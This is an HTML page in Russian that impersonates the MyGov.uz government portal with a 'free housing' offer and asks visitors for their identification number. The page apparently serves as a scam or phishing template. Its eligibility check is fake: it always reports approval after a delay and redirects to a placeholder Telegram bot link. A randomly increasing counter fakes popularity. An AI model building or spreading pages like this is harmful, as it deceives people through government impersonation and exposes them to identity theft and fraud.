<!DOCTYPE html>
<html lang="ru" class="h-full bg-gray-50">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MyGov.uz — Бесплатное жильё</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            primary: '#1E5F74',
            secondary: '#E8F0F2',
            accent: '#34D399',
          }
        }
      }
    }
  </script>
</head>

<body class="h-full flex bg-gray-50">

  <!-- Боковое меню -->
  <aside class="hidden md:flex md:flex-col w-64 bg-primary text-white h-screen fixed top-0 left-0 shadow-lg">
    <div class="flex flex-col items-center py-8 space-y-4">
      <img src="logo.png" alt="Логотип" class="w-20 h-20 rounded bg-white p-2">
      <h1 class="text-lg font-bold">MyGov.uz</h1>
    </div>
    <nav class="flex-1 flex flex-col items-center space-y-6 mt-10">
      <a href="#" class="hover:text-accent">О программе</a>
      <a href="#" class="hover:text-accent">Проверка права</a>
      <a href="#" class="hover:text-accent">Новости</a>
      <a href="#" class="hover:text-accent">Контакты</a>
    </nav>
  </aside>

  <!-- Основной Контент -->
  <main class="flex-1 md:ml-64 flex flex-col items-center justify-center p-6 space-y-8 min-h-screen">

    <!-- Счётчик -->
    <div class="bg-accent text-white px-4 py-2 rounded-full text-sm font-semibold">
      Сегодня оформлено квартир: <span id="counter" class="font-bold">315</span>
    </div>

    <!-- Центральная карточка -->
    <div class="bg-white shadow-lg rounded-2xl p-8 max-w-md w-full space-y-6 text-center">
      <h2 class="text-2xl font-bold text-primary">Проверь своё право на жильё</h2>
      <p class="text-gray-600">Введите ваш ИИН для бесплатной проверки:</p>
      <input type="text" id="iinInput" placeholder="Ваш ИИН" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-accent">
      <button onclick="startCheck()" class="bg-primary hover:bg-accent text-white font-bold py-3 w-full rounded-lg transition">
        Проверить
      </button>
      <div id="loading" class="text-center text-primary mt-2 text-sm"></div>
    </div>

    <!-- Кнопка Telegram -->
    <a href="https://t.me/your_bot" target="_blank" class="mt-6 bg-accent hover:bg-green-400 text-white font-bold py-3 px-8 rounded-lg transition">
      Перейти в Telegram-бот
    </a>

  </main>

  <!-- Скрипт -->
  <script>
    function startCheck() {
      const iin = document.getElementById('iinInput').value.trim();
      const loading = document.getElementById('loading');
      if (iin.length < 7) {
        loading.innerHTML = "<span class='text-red-500'>Введите корректный ИИН</span>";
        return;
      }
      loading.innerHTML = "Проверка данных...";
      setTimeout(() => {
        loading.innerHTML = "✅ Одобрено! Переход...";
        setTimeout(() => {
          window.location.href = "https://t.me/your_bot";
        }, 1500);
      }, 2000);
    }

    // Счётчик
    let counter = document.getElementById('counter');
    setInterval(() => {
      counter.innerText = parseInt(counter.innerText) + Math.floor(Math.random() * 3);
    }, 5000);
  </script>

</body>
</html>
